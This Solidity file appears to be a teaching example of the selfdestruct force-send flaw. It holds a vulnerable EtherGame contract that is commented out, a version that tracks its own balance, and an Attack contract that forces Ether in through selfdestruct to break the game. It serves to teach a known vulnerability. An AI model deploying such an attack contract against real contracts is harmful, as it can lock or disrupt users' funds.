// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// contract EtherGame {
//     uint public targetAmount = 7 ether;
//     address public winner;

//     receive () external payable {
//         deposit();
//     }

//     function deposit() public payable {
//         require(msg.value == 1 ether, "You can only send 1 Ether");
        
//         uint balance = address(this).balance;
//         require(balance <= targetAmount, "Game is over");

//         if (balance == targetAmount) {
//             winner = msg.sender;
//         }
//     }

//     function claimReward() public {
//         require(msg.sender == winner, "Not winner");

//         (bool sent,) = msg.sender.call{ value: address(this).balance }("");
//         require(sent, "Failed to send Ether");
//     }

//     function getBalance() public view returns (uint) {
//         return address(this).balance;
//     }
// }

contract EtherGame {
    uint public targetAmount = 3 ether;
    uint public balance;
    address public winner;

    receive () external payable {
        deposit();
    }

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");
        
        balance += msg.value;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent,) = msg.sender.call{ value: balance }("");
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns (uint) {
        return balance;
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}